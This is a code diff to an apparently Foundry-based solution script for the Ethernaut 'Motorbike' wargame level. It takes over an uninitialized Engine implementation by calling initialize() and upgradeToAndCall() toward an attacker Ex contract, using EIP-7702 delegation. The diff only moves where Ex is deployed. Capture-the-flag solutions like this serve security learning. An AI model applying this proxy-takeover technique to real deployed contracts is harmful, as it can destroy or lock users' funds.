@@ -23,10 +23,10 @@ contract Ex {
 
 contract Sol {
 
-    function solve(Ethernaut ethernaut, address level, address _eg, address _ex) public {
+    function solve(Ethernaut ethernaut, address level, address _eg) public {
         ethernaut.createLevelInstance(Level(level));
         Engine(_eg).initialize();
-        Engine(_eg).upgradeToAndCall(address(_ex), abi.encodeWithSignature("ex()"));
+        Engine(_eg).upgradeToAndCall(address(new Ex()), abi.encodeWithSignature("ex()"));
     }
 }
 // contract Sol {
@@ -57,10 +57,11 @@ contract MotorbikeSol is Script {
         vm.signAndAttachDelegation(address(sol), pk);
 
         uint256 nonce = vm.getNonce(address(level));
+        Motorbike mb_ = Motorbike(payable(vm.computeCreateAddress(address(level), nonce+1)));
         Engine eg_ = Engine(vm.computeCreateAddress(address(level), nonce));
 
-        Sol(msg.sender).solve(ethernaut, address(level), address(eg_), address(new Ex()));
-        console.log("Motorbike: ", address(vm.computeCreateAddress(address(level), nonce+1)));
+        Sol(msg.sender).solve(ethernaut, address(level), address(eg_));
+        console.log("Motorbike: ", address(mb_));
         console.log("Engine: ", address(eg_));
         console.log("code size: ", _getCodeSize(address(eg_)));
 
